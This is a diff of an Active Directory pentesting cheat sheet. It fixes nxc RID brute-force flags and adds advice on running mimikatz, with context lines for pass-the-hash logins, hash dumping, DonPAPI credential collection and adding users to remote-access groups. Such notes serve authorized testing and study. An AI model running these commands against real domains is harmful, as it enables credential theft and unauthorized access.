@@ -10,7 +10,7 @@
 ^AD notes:Check for Certificate based attacks with certipy 
 ^AD notes:If it's an AD network, check for additional network adapters in case of pivoting being needed. If so, set up a pivot and relay all tools over that “jumpbox” so you can target the other machines in the other network.
 ^AD notes:Remember to bruteforce different protocols with credentials you have. Remember to use NTLM authentication too.
-^AD notes:After localadmin on a windows host, dump all hashes using nxc and/or mimikatz.
+^AD notes:After localadmin on a windows host, dump all hashes using nxc and/or mimikatz. Use mimikatz on a reverse shell or rdp but not on evil-winrm
 ^AD notes:Recheck all NTLM hashes and passwords against all users on all AD hosts, both locally and on domain users.
 ^AD notes:Check UDP ports. 
 ^AD notes:Rescan if you're stuck, verify tools are working properly and you're running them properly.
@@ -104,8 +104,9 @@ create new domain user and add to domain group:net localgroup "Remote Management
 create new domain user and add to domain group:net localgroup "Remote Desktop Users" edwin /add #target-machine
 donpapi collect -t <target> -d <domain> -u <user> -H:<ntlm> #kali-machine
 ^Domain info probe:nxc smb <target> #probe SMB to fingerprint domain/workgroup, host OS, SMB signing, and basic share/auth posture (no creds); kali-machine
-nxc smb:nxc smb <target> -u '' -p '' --ridbrute #enumerate domain users/groups via RID brute-force over SMB using a null session (no creds); kali-machine
-nxc smb:nxc smb <target> -u 'guest' -p '' --ridbrute #enumerate domain users/groups via RID brute-force over SMB using the Guest account with a blank password; kali-machinenxc smb:nxc smb <target> -u '<user>' -H '<ntlm>' --local-auth #local auth with NT hash; kali-machine
+nxc smb:nxc smb <target> -u '' -p '' --rid-brute #enumerate domain users/groups via RID brute-force over SMB using a null session (no creds); kali-machine
+nxc smb:nxc smb <target> -u 'guest' -p '' --rid-brute #enumerate domain users/groups via RID brute-force over SMB using the Guest account with a blank password; kali-machine
+nxc smb:nxc smb <target> -u '<user>' -H '<ntlm>' --local-auth #local auth with NT hash; kali-machine
 nxc smb:nxc smb <target> -d '<domain>' -u '<user>' -H '<ntlm>' #domain auth with NT hash; kali-machine
 nxc smb:nxc smb <target> -d '<domain>' -u '<user>' -p '<password>' --shares #list shares; kali-machine
 nxc smb:nxc smb <target> -u '<domain>\<user>' -p '<password>' --shares #list shares; kali-machine
